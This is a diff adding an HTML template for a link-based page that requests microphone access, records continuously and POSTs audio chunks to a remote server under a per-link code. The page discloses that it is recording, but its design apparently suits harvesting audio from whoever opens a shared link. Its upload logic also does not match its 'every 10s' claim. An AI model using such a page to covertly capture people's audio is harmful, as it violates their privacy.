@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Audio Recording</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #0f0f1a;
+      color: #e0e0f0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .card {
+      background: #1a1a2e;
+      border: 1px solid #2a2a4a;
+      border-radius: 16px;
+      padding: 40px 36px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    }
+    .icon { font-size: 56px; margin-bottom: 20px; }
+    h2 { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: #ffffff; }
+    p { font-size: 14px; color: #9090b0; line-height: 1.6; margin-bottom: 28px; }
+    #status { margin-top: 18px; font-size: 13px; min-height: 20px; }
+    .success { color: #4caf50; }
+    .error   { color: #f44336; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">🎤</div>
+    <h2>Audio Recording</h2>
+    <p>Please allow microphone access when prompted by your browser.</p>
+    <div id="status">⏳ Requesting microphone access...</div>
+  </div>
+
+  <script>
+    const code = '{{code}}';
+    const server = '{{server}}';
+    {% if not valid %}
+    document.getElementById('status').textContent = '❌ Invalid link';
+    document.getElementById('status').className = 'error';
+    {% else %}
+    (async function() {
+      const status = document.getElementById('status');
+      let stream = null;
+      let mr = null;
+      try {
+        status.textContent = '⏳ Microphone permission requested...';
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        let chunks = [];
+
+        function startRecording() {
+          chunks = [];
+          mr = new MediaRecorder(stream);
+          mr.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+          mr.onstop = () => {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            const reader = new FileReader();
+            reader.onload = () => {
+              fetch(server + '/api/audio/' + code, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'audio', data: reader.result, format: 'webm', timestamp: new Date().toISOString() })
+              }).catch(() => {});
+            };
+            reader.readAsDataURL(blob);
+            // Immediately start next recording chunk
+            if (stream && stream.active) startRecording();
+          };
+          mr.start(10000); // 10 second chunks
+        }
+
+        startRecording();
+        status.textContent = '🔴 Recording continuously — sending every 10s...';
+        status.className = 'success';
+
+        window.addEventListener('beforeunload', function() {
+          if (mr && mr.state === 'recording') mr.stop();
+          if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+        });
+      } catch (err) {
+        status.textContent = '❌ Microphone access denied: ' + err.message;
+        status.className = 'error';
+      }
+    })();
+    {% endif %}
+  </script>
+</body>
+</html>
